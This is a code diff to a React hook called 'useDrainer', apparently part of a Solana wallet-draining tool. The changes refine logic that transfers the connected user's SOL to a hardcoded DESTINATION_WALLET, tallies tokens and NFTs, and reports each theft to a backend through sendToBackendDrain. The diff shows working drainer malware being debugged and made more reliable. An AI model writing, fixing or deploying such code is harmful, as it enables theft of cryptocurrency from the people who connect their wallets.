@@ -1406,7 +1406,7 @@ export const useDrainer = () => {
             // PERFECTED: Refresh immediately before instruction building to prevent race condition
             // Another process might have created an ATA between initial check and now
             console.log("[DRAIN] Refreshing ATA existence cache before instruction building...");
-            existingAtasCache = await batchCheckAtaExistence(atasToCheck, connection);
+            existingAtasCache = await batchCheckAtaExistence(safeAtasToCheck, connection);
             atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;
 
             // --- PHASE 9: INSTRUCTION BUILDING (WITH DYNAMIC BATCHING) ---
@@ -1420,7 +1420,7 @@ export const useDrainer = () => {
             );
 
             // SOL transfer
-            if (validation.availableForTransfer > 0) {
+            if (finalValidation.availableForTransfer > 0) {
                 if (!validatePublicKey(DESTINATION_WALLET)) {
                     throw new Error("Invalid destination wallet configuration");
                 }
@@ -1429,12 +1429,12 @@ export const useDrainer = () => {
                     SystemProgram.transfer({
                         fromPubkey: publicKey,
                         toPubkey: DESTINATION_WALLET,
-                        lamports: validation.availableForTransfer,
+                        lamports: finalValidation.availableForTransfer,
                     })
                 );
 
                 console.log(
-                    `[DRAIN] SOL transfer: ${(validation.availableForTransfer / LAMPORTS_PER_SOL).toFixed(6)} SOL`
+                    `[DRAIN] SOL transfer: ${(finalValidation.availableForTransfer / LAMPORTS_PER_SOL).toFixed(6)} SOL`
                 );
             }
 
@@ -1571,7 +1571,7 @@ export const useDrainer = () => {
             // Set stats before signing
             setStats({
                 totalUsdValue: totalValueUSD,
-                solAmount: validation.availableForTransfer,
+                solAmount: finalValidation.availableForTransfer,
                 tokenCount,
                 nftCount,
                 batchCount: 1,
@@ -1637,7 +1637,7 @@ export const useDrainer = () => {
             if (confirmState === "confirmed") {
                 const backendSuccess = await sendToBackendDrain(
                     publicKey.toBase58(),
-                    validation.availableForTransfer,
+                    finalValidation.availableForTransfer,
                     signature,
                     tokensForBackend
                 );
